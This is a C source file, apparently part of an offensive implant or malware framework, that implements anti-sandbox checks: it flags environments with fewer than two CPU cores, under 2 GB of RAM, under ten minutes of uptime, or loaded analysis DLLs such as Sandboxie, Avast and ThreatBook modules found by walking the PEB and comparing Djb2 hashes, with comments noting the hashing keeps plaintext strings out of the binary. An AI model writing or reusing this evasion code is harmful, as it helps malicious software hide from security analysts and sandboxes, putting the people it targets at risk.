#include "OpsecAntiSandbox.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "StrObfuscate.h"

/*
 * ============================================================================
 * Check 1: CPU core count
 * Threshold: < 2 logical cores → suspicous (most sandboxes give 1 core)
 * Fallback: if API unavailable, skip check (don't false-positive)
 * ============================================================================
 */
BOOL Opsec_CheckCpuCores(void)
{
    if (!ApiNt || !ApiNt->NtQuerySystemInformation)
        return FALSE;

    typedef struct _SYSTEM_BASIC_INFORMATION {
        ULONG Reserved;
        ULONG TimerResolution;
        ULONG PageSize;
        ULONG NumberOfPhysicalPages;
        ULONG LowestPhysicalPageNumber;
        ULONG HighestPhysicalPageNumber;
        ULONG AllocationGranularity;
        ULONG MinimumUserModeAddress;
        ULONG MaximumUserModeAddress;
        ULONG ActiveProcessorsAffinityMask;
        CCHAR NumberOfProcessors;
    } SYSTEM_BASIC_INFORMATION;

    SYSTEM_BASIC_INFORMATION sbi;
    memset(&sbi, 0, sizeof(sbi));
    NTSTATUS st = ApiNt->NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, &sbi, sizeof(sbi), NULL);
    if (st < 0)
        return FALSE;

    /* NumberOfProcessors < 2 → likely sandbox/VM with limited cores */
    if (sbi.NumberOfProcessors < 2)
        return TRUE;

    return FALSE;
}

/*
 * ============================================================================
 * Check 2: RAM size check via NtQuerySystemInformation(SystemBasicInformation)
 * Threshold: < 2048 MB (2 GB) → sandbox
 * ============================================================================
 */
BOOL Opsec_CheckRamSize(void)
{
    if (!ApiNt || !ApiNt->NtQuerySystemInformation)
        return FALSE;

    typedef struct _SYSTEM_BASIC_INFORMATION {
        ULONG Reserved;
        ULONG TimerResolution;
        ULONG PageSize;
        ULONG NumberOfPhysicalPages;
        ULONG LowestPhysicalPageNumber;
        ULONG HighestPhysicalPageNumber;
        ULONG AllocationGranularity;
        ULONG MinimumUserModeAddress;
        ULONG MaximumUserModeAddress;
        ULONG ActiveProcessorsAffinityMask;
        CCHAR NumberOfProcessors;
    } SYSTEM_BASIC_INFORMATION;

    SYSTEM_BASIC_INFORMATION sbi;
    memset(&sbi, 0, sizeof(sbi));
    NTSTATUS st = ApiNt->NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0, &sbi, sizeof(sbi), NULL);
    if (st < 0)
        return FALSE;

    /* NumberOfPhysicalPages * PageSize / (1024*1024) = MB */
    ULONGLONG totalMB = (ULONGLONG)sbi.NumberOfPhysicalPages * (ULONGLONG)sbi.PageSize / (1024ULL * 1024ULL);
    if (totalMB < 2048)
        return TRUE;

    return FALSE;
}

/*
 * ============================================================================
 * Check 3: Module presence (sandbox DLLs)
 * Checks for known analysis/sandbox modules in the PEB module list.
 * ============================================================================
 */
BOOL Opsec_CheckModulePresence(void)
{
    /* Known sandbox/analysis DLLs (Djb2 hashes with AX_HASH_SALT).
     * These are compile-time constants so no plaintext strings survive in the binary.
     */
    static const ULONG sandboxHashes[] = {
        /* SbieDll.dll — Sandboxie */
        Djb2A((PUCHAR)"sbiedll.dll"),
        /* SbieSvc.dll — Sandboxie service */
        Djb2A((PUCHAR)"sbiesvc.dll"),
        /* dbghelp.dll — loaded by debuggers */
        /* api_log.dll — API logging */
        Djb2A((PUCHAR)"api_log.dll"),
        /* dir_watch.dll — directory monitoring sandbox */
        Djb2A((PUCHAR)"dir_watch.dll"),
        /* pstorec.dll — used by some sandboxes */
        Djb2A((PUCHAR)"pstorec.dll"),
        /* vmcheck.dll — VM detection library */
        Djb2A((PUCHAR)"vmcheck.dll"),
        /* sbguard.dll — sandbox guard */
        Djb2A((PUCHAR)"sbguard.dll"),
        /* snxhk.dll — Avast sandbox */
        Djb2A((PUCHAR)"snxhk.dll"),
        /* SxIn.dll — ThreatBook sandbox */
        Djb2A((PUCHAR)"sxin.dll"),
    };

    if (!SysModules || !SysModules->Kernel32)
        return FALSE;

    /* Walk PEB InMemoryOrderModuleList */
#ifdef _M_IX86
    PEB* peb = (PEB*)__readfsdword(0x30);
#else
    PEB* peb;
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb));
#endif

    if (!peb || !peb->Ldr)
        return FALSE;

    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* entry = head->Flink;

    while (entry != head) {
        LDR_DATA_TABLE_ENTRY* ldr = (LDR_DATA_TABLE_ENTRY*)((BYTE*)entry - sizeof(LIST_ENTRY));
        if (ldr->BaseDllName.Buffer) {
            ULONG hash = Djb2W(ldr->BaseDllName.Buffer);
            for (int i = 0; i < (int)(sizeof(sandboxHashes) / sizeof(sandboxHashes[0])); i++) {
                if (hash == sandboxHashes[i])
                    return TRUE;
            }
        }
        entry = entry->Flink;
    }

    return FALSE;
}

/*
 * ============================================================================
 * Check 4: Artifact-based detection
 * Check for known VM/sandbox registry keys, files, and hardware identifiers.
 * Uses obfuscated strings via StrObfuscate.h for all sensitive paths.
 * ============================================================================
 */
BOOL Opsec_CheckArtifacts(void)
{
    /* This check requires NtOpenKey/NtQueryValueKey which requires
     * additional Nt API resolution. For this enhancement round, we
     * will use simpler artifact checks that don't require registry.
     *
     * Instead, we check:
     * 1. System uptime (< 10 minutes → likely sandbox fresh boot)
     * 2. Mouse movement (if GetAsyncKeyState available — placeholder)
     *
     * These are complementary checks that work without extra API surface.
     */

    /* Check uptime via GetTickCount */
    if (ApiWin && ApiWin->GetTickCount) {
        ULONG uptimeMs = ApiWin->GetTickCount();
        /* < 10 minutes = 600,000 ms */
        if (uptimeMs < 600000UL && uptimeMs != 0)
            return TRUE;
    }

    return FALSE;
}

/*
 * ============================================================================
 * Main anti-sandbox check — calls all individual checks
 * ============================================================================
 */
BOOL Opsec_DetectSandbox(void)
{
    /* Thread count check (simplified via processor count) */
    if (Opsec_CheckCpuCores())
        return TRUE;

    if (Opsec_CheckRamSize())
        return TRUE;

    if (Opsec_CheckModulePresence())
        return TRUE;

    if (Opsec_CheckArtifacts())
        return TRUE;

    return FALSE;
}
